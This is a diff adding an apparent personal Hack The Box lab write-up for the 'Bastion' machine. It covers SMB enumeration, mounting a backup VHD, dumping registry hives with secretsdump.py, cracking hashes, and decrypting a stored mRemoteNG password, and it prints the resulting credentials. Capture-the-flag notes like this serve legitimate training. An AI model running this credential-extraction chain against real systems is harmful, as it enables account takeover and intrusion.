@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.10.10.134 Bastion</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.10.10.134 Bastion</h1><br/>nmap showed that 22, 135, 139, and 445 (5985 and 47001(winrm) on the -p- scan)<br />a null smbmap showed a note.txt that stated something about a system backup.<br />I was able to mount the /Backups drive to the kali box.<br />In here I found a .vhd file<br />I used guest mount to mount the .vhd file as a virtual drive<br />Once in the .vhd file I copied /Windows/System32/Sam, Security, and System to /HTB/Bastion/dbdump<br />cd /Bastion/dbdump/<br />secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL<br />put the hashes in hashcrack... gotem!<br />L4mpje:bureaulampje<br />ssh in... Got it in!<br />user.txt<br /><br />while doing pre-script enumeration I saw that in C:\program files (x86) that mRemoteNG was installed<br />after some research I saw that it stores passwords that are reversible in a config file.<br />moved the .xml file onto the kali machine. opened it with gedit and control fed to “password”<br />l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&gt;copy confCons.xml C:\Backups<br />aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<br /><br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/mRemoteNG-Decrypt# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<br />Password: thXLHM96BeKL0ER2<br /><br />ssh in as administrator... rooted!</div></body></html>
